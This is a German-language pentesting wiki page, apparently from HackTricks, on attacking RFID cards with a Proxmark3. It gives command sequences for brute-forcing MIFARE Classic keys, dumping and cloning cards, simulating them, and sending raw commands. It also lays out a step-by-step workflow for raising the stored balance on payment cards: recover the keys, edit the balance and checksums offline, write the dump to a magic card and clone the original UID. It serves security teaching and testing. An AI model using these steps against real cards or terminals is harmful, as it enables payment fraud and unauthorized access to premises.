# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Angreifen von RFID-Systemen mit Proxmark3

Als Erstes benötigst du einen [**Proxmark3**](https://proxmark.com) und musst die [**Software und ihre Abhängigkeit**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**en installieren**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Angreifen von MIFARE Classic 1KB

Es verfügt über **16 Sektoren**, jeder davon hat **4 Blöcke**, und jeder Block enthält **16B**. Die UID befindet sich in Sektor 0, Block 0 (und kann nicht geändert werden).\
Um auf die einzelnen Sektoren zuzugreifen, benötigst du **2 Schlüssel** (**A** und **B**), die in **Block 3 jedes Sektors** (Sector Trailer) gespeichert sind. Der Sector Trailer speichert außerdem die **Access Bits**, die mithilfe der 2 Schlüssel die **Lese- und Schreibberechtigungen** für **jeden Block** festlegen.\
2 Schlüssel sind beispielsweise nützlich, um Leseberechtigungen zu vergeben, wenn du den ersten kennst, und Schreibberechtigungen, wenn du den zweiten kennst.

Es können mehrere Angriffe durchgeführt werden<sup>[[1]](#references)</sup>.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Der Proxmark3 ermöglicht weitere Aktionen wie **eavesdropping** einer **Tag-to-Reader communication**, um zu versuchen, sensible Daten zu finden. Bei dieser Karte könntest du die Kommunikation einfach sniffen und den verwendeten Schlüssel berechnen, da die verwendeten **cryptographic operations** schwach sind und du ihn mithilfe des Klar- und Chiffretexts berechnen kannst (Tool `mfkey64`).<sup>[[3]](#references)</sup>

#### MiFare Classic: schneller Workflow für den Missbrauch gespeicherter Werte

Wenn Terminals Guthaben auf Classic-Karten speichern, sieht ein typischer End-to-End-Workflow folgendermaßen aus:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notizen

- `hf mf autopwn` orchestriert verschachtelte Angriffe im Stil von nested/darkside/HardNested, stellt Schlüssel wieder her und erstellt Dumps im Ordner für Client-Dumps.
- Das Schreiben von Block 0/UID funktioniert nur mit Magic-Karten der Generation gen1a/gen2. Normale Classic-Karten haben eine schreibgeschützte UID.<sup>[[2]](#references)</sup>
- Viele Deployments verwenden Classic-„Value Blocks“ oder einfache Prüfsummen. Stelle sicher, dass nach der Bearbeitung alle duplizierten/komplementierten Felder und Prüfsummen konsistent sind.

Eine übergeordnete Methodik und Gegenmaßnahmen findest du unter:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Rohbefehle

IoT-Systeme verwenden manchmal **nicht markierte oder nicht kommerzielle Tags**. In diesem Fall kannst du Proxmark3 verwenden, um **benutzerdefinierte Rohbefehle an die Tags** zu senden.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Mit diesen Informationen kannst du versuchen, nach Informationen über die Karte und die Art der Kommunikation mit ihr zu suchen. Proxmark3 ermöglicht das Senden von Raw-Befehlen wie: `hf 14a raw -p -b 7 26`

### Scripts

Die Proxmark3-Software enthält eine vorinstallierte Liste von **Automatisierungsskripten**, mit denen du einfache Aufgaben ausführen kannst. Verwende den Befehl `script list`, um die vollständige Liste abzurufen. Verwende anschließend den Befehl `script run`, gefolgt vom Namen des Scripts:
```
proxmark3> script run mfkeys
```
Du kannst ein Script erstellen, um **tag readers zu fuzzing**, indem du die Daten einer **valid card** kopierst und einfach ein **Lua script** schreibst, das bei jeder Iteration ein oder mehrere zufällige **bytes** verändert und prüft, ob der **reader abstürzt**.

## Referenzen

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
